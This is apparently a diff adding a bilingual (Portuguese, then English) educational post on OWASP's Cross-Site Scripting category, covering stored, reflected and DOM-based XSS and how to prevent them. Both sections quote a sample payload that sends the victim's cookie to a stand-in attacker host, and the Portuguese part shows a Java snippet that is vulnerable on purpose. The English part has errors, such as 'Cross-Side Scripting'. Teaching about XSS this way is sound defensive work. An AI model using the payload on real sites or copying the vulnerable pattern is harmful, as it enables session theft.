@@ -1,0 +1,76 @@
+A3 - Cross-Site Scripting (XSS)
+"Falhas XSS acontecem sempre que uma aplicação pega dados que não são confiáveis e os envia para um web browser sem uma validação apropriada ou 'escaping'. XSS permite que hackers executam scripts no browser da vítima, que podem sequestrar sessões de usuário, desfigurar sites ou redirecionar o usuário para sites maliciosos."
+
+Agentes de ameaça: Específico de aplicação
+Considere qualquer pessoa que possa enviar dados não confiáveis para o sistema, incluindo usuários externos, internos e administradores.
+
+Vetores de ataque: Capacidade de explorar o sistema: MÉDIA
+O hacker envia scripts de ataques baseados em texto que exploram o interpretador do browser. Quase qualquer fonte de dados pode ser um vetor de ataque, incluindo fontes internas como dados do banco de dados.
+
+Falha de segurança: Prevalência: MUITO LARGAMENTE ESPALHADA Detectabilidade: Fácil
+XSS é a falha de segurança para aplicações web mais prevalente. Falhas XSS ocorrem quando uma aplicação inclui dados fornecidos por um usuário em uma página enviada para o browser sem propriamente validar ou escapar o seu conteúdo. Há três tipos de falhas XSS conhecidos: 1. Stored, 2. Reflected 3. DOM based XSS
+
+Ataques "Stored" são aqueles onde o script injetado está permanentemente armazenado nos servidores do alvo, como em um banco de dados, em um fórum de mensagens, log de visitantes, campo de comentários, etc. A vítima então recupera o script malicioso do servidor quando requisitar a informação armazenada. XSS armazenado é, também, por vezes referido como Persistente ou XSS Tipo 1.
+Ataques "Reflected" são aqueles onde o script injetado é refletido para fora do servidor web, como em uma mensagem de erro, resultado de busca, ou qualquer outra resposta que inclua algum ou todo o input enviado para o servidor como parte da requisição. Ataques refletios são entregues a vítimas por outra rota, como por uma mensagem de e-mail, ou em algum outro web site. Quando um usuário é enganado a clicar em um link malicioso, enviando uma forma especialmente construída, ou apenas navegando para um site malicioso, o código injetado viaja para o web site vulnerável, que reflete o ataque de volta para o browser do usuário. O browser então executa o código porque veio de um servidor "confiável". XSS refletido também é, algumas vezes, referido como não-persistente ou XSS Tipo II
+
+XSS baseado em DOM - é um ataque XSS onde o payload do ataque é executado como um resultado da modificação do ambiente DOM no browser da vítima, usado pelo script do lado do cliente original, de forma que o código do lado do cliente rode de uma maneira inesperada. Isto é, a própria página (A resposta HTTP, no caso) não muda, mas o código contido no lado do cliente na página executa de forma diferente, por causa das modificações maliciosas que ocorreram no ambiente DOM.
+Este é o contraste a outros ataques XSS, onde o ataque de payload é colocado na página de resposta.
+
+Detecção de grande parte das falhas XSS é geralmente fácil, via testes ou análise de código.
+
+Impacto técnico: Moderado
+Hackers podem executar scripts no browser de uma vítima para sequestrar sessões de usuários, desfigurar sites, inserir conteúdo hostil, redirecionar usuários, sequestrar o browser do usuário usando malware, etc.
+
+Impactos de negócio: Específico pra aplicação/negócio
+Considere o valor de negócio do sistema afetado e todos os dados que ele processa.
+Também considere o impacto de negócio da exposição pública dessa vulnerabilidade
+
+ESTOU VULNERÁVEL A XSS?
+Você está vulnerável se não garante que todas as entradas disponibiliadas pelo usuário estão apropriadamente escapadas, ou se você não verifica que são seguras através de validação do input, antes de incluir o input na página do output. Sem escapamento e validação apropriadas, o input será tratado como conteúdo ativo no browser. Se ajax está sendo usado para atualizar dinamicamente a página, você está usando APIs JavaScript seguras? Para APIs não-seguras, encoding e validação também devem ser feitos.
+
+Ferramentas automatizadas podem encontrar alugns problemas de XSS automaticamente. De toda a forma, cada aplicação constrói páginas de saída diferentes e usa diferentesi nterpretadores de browser como JavaScript, ActiveX, Flash e Silverlight, fazendo com que a deteção automvática fique mais complicada. Portanto, cobertura completa requer uma combinação de revisão de código manual e testes de penetração, com a adição das abordagens automáticas.
+
+Tecnologias Web 2.0, como Ajax, fazem o XSS muito mais difícil de ser detectado por ferramentas automáticas.
+
+COMO EU ME PREVINO DE XSS?
+Prevenir-se de XSS requer a separação de dados não confiáveis do conteúdo ativo do browser.
+1. A opção preferida é fazer o escapamento apropriado de todos os dados não-confiados baseados n ocontexto HTML (body, attribute, javascript, css ou URL) que os dados podem ser colocatos dentro. Veja a planilha de prevenção de XS da OWASP para mais detalhes nas técnicas de escapamento de dados.
+2. Validação de input positivo ou "lista branca" também 'e recomendado, porque ajuda a proteger de XSS, mas não é uma defesa completa porque várias aplicações requerem caracteres especiais noseu input. Esse tipo de validação deve, o máximo possível, validar o compirmento, caracteres, formato e regras de negócio nesses dados antes de aceitar o input.
+3. Para conteúdos ricos, considere bibliotecas de auto-sanitização como o AntiSamy ou o JAVA HTML Sanitizer Project.
+4. Considere as políticas de segurança de conteúdo pra proteger-se contra XSS dentro do seu site inteiro.
+
+Exemplo de cenário de ataque
+A aplicação usa dados não-confiáveis na construção do seguinte snippet HTML sem validação ou escapamento
+
+(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
+
+O hacker modifica o parâmetro CC no seu browser para
+'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
+Isso faz com que a ID de sessão da vítima seja mandada ao site do atacante, permitindo que o atacante sequestre a sessão corrente do usuário.
+Note que os hackers também podem usar XSS para vencer qualquer defesa automática CSRF que a aplicação pode empregar. Veja A8 para mais informações sobre CSRF.
+
+This post is part of a compilation talking about the ten most common security flaws for web applications. To see them all, click here.
+
+What is a Cross-Side Scripting (XSS) flaws?
+OWASP defines a Cross-Side Scripting flaws as
+        Systems that uses non-trusted data written by a user without proper validation or escaping, allowing attackers to execute scripts in the victim's browsers, hijacking user sessions, defacing web sites or redirecting the user to malicious web sites.
+
+So, if your application accepts user inputs in a form such as
+'<script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo=' + document.cookie </script>'
+
+Without proper validation or escaping, your application is vulnerable to a XSS flaw.
+
+There are three main types of XXS flaws. They can be Stored, Reflected or DOM-based.
+Stored XSS flaws happen when the attacker sends a malicious script to be saved by a database, for example. Whenever you request that information, the user's browser will interpret the script and the flaw will happen.
+Reflected XSS flaws happen when your application uses the attacker's input to return something in the webpage as a result (for example, the input string for a search). If there's a script, then the browser will interpret the script and run when the response page gets loaded in your browser.
+DOM-Based XSS are the flaws that makes the browser reinterpret the DOM unexpectedly. A simple example of that would be using alert("Hello") as an input for a form field. Whenever we fetch that information back, we'll be generating a pop-up window with "Hello" written in it.
+
+What can be the impacts of a Cross-Side Scripting Attack?
+Attackers can execute scripts in a victim's browser to hijack user sessions, deface websites, insert hostile content, redirect users, hijack the user's browser using malware, etc. The business impact depends on the application data it holds and on the business impact of publicly exposing this vulnerability.
+
+How can I prevent this from happening?
+There are automated tools that can find some XSS flaws automatically. However, each application builds different outputs and uses differente browser interpreters, like JavaScript, ActiveX, Flash, Silverlight, making automatic detecction harder. To a complete coverage, you will need to combine manual code reviews with penetration testing and automatic approaches.
+XSS preventing requires separation of untrusted data from the active browser content. 
+
+You can escape all untrusted data based on the HTML context we'll be placing (OWASP has a spreadsheet with data escaping techniques), use positive or "whitelist" input validation - it's not the best defense if you use special characters in your input -, auto-sanitization libraries, like AntiSamy or the Java HTML Sanitizer Project, and lastly you can also consider the Content Security Policy to defend your entire site against XSS.
+
